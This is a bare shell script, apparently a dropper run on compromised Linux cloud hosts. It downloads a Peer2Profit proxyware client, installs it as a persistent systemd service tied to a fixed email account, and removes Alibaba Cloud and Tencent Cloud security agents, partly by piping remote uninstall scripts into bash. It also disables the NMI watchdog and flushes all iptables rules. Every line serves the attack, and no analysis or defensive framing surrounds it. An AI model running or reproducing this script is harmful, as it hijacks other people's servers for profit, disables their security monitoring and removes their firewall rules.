cd /opt
wget https://updates.peer2profit.com/p2pclient
chmod +x p2pclient

cat >/etc/systemd/system/Peer2Profit.service <<EOL
[Unit]
Description=Peer2Profit
[Service]
Type=simple
ExecStart=/opt/p2pclient -l u223110@163.com
TimeoutSec=15
Restart=always
[Install]
WantedBy=multi-user.target
EOL

systemctl enable Peer2Profit
systemctl start Peer2Profit

if ps aux | grep -i '[a]liyun'; then
  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi

echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
iptables -F